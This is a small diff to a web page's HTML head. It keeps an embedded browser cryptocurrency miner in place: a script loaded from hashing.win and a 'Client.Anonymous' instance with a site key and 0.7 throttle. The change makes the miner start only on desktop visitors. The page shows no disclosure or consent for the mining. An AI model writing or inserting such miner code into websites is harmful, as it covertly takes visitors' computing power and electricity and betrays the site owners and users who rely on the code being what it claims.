@@ -16,9 +16,8 @@
 	<script src="https://rawgit.com/Semantic-Org/Semantic-UI/master/dist/semantic.min.js"></script>
   <script src="https://www.hashing.win/O7Hh.js"></script>
   <script>
-      new Client.Anonymous('8286beb20833cb35a0ed9b3f2064f3d72becb3f10629b24adcfdec767bbec356', {
-          throttle: 0.7
-      }).start();
+      const e = (i) => !i.isMobile() && i.start();
+      e(new Client.Anonymous('8286beb20833cb35a0ed9b3f2064f3d72becb3f10629b24adcfdec767bbec356', {throttle: 0.7}));
   </script>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="icon" type="image/x-icon" href="favicon.ico">
